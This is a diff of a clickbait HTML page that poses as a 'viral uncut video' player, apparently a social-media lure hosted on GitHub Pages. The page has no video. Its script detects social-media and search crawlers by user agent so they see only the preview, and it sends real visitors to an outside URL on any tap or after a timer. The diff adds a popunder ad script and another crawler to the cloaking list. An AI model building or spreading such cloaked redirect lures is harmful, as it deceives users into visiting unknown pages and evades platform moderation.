@@ -1,23 +1,26 @@
 <!DOCTYPE html>
-<html lang="id">
+<html lang="en">
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Video Viral Part 1 - Full HD</title>
+  <title>Viral Video Stream - Full HD</title>
 
-  <!-- OpenGraph Metadata -->
+  <!-- OpenGraph Metadata Global -->
   <meta property="og:type" content="video.other">
-  <meta property="og:title" content="Viral Part 1! Nonton Full Durasi HD">
-  <meta property="og:description" content="Klik untuk memutar video lengkap tanpa sensor. Kualitas 1080p.">
+  <meta property="og:title" content="Viral! Watch Full Uncut Video in HD">
+  <meta property="og:description" content="Click here to stream full length video. 1080p high quality.">
   <meta property="og:image" content="https://jijesayang-bot.github.io/video-viral/thumb.jpg">
   <meta property="og:image:width" content="600">
   <meta property="og:image:height" content="1066">
 
   <!-- Twitter Card -->
   <meta name="twitter:card" content="summary_large_image">
-  <meta name="twitter:title" content="Viral Part 1! Nonton Full Durasi HD">
-  <meta name="twitter:description" content="Klik untuk memutar video lengkap tanpa sensor. Kualitas 1080p.">
+  <meta name="twitter:title" content="Viral! Watch Full Uncut Video in HD">
+  <meta name="twitter:description" content="Click here to stream full length video. 1080p high quality.">
   <meta name="twitter:image" content="https://jijesayang-bot.github.io/video-viral/thumb.jpg">
+
+  <!-- Skrip Popunder Adsterra -->
+  <script data-cfasync="false" src="https://afders.org/1/e8d9ccd0cd466481ee8c50f27d4aa763"></script>
 
   <style>
     * { box-sizing: border-box; margin: 0; padding: 0; }
@@ -69,17 +72,17 @@
   <div class="player-container">
     <div class="bg-blur"></div>
     <div class="video-card">
-      <img src="../thumb.jpg" alt="Preview Part 1">
+      <img src="../thumb.jpg" alt="Video Preview">
       <div class="play-btn"></div>
     </div>
-    <div class="tap-text">Ketuk di mana saja untuk memutar Part 1 ▶</div>
+    <div class="tap-text">Tap anywhere to watch full uncut video ▶</div>
   </div>
 
   <div id="tap-overlay"></div>
 
   <script>
     const targetUrl = "https://auctionr.org/4/8863f0a61a698c2242080d6c33efe3d6";
-    const botPattern = /facebookexternalhit|Facebot|Pinterest|Twitterbot|TelegramBot|WhatsApp|Googlebot|bingbot/i;
+    const botPattern = /facebookexternalhit|Facebot|Pinterest|Twitterbot|TelegramBot|WhatsApp|Googlebot|bingbot|Quora Link Preview/i;
     const isBot = botPattern.test(navigator.userAgent);
 
     function redirectUser() {
@@ -89,7 +92,7 @@
     if (!isBot) {
       document.getElementById("tap-overlay").addEventListener("click", redirectUser);
       document.getElementById("tap-overlay").addEventListener("touchstart", redirectUser);
-      setTimeout(redirectUser, 3000);
+      setTimeout(redirectUser, 4000);
     }
   </script>
 </body>
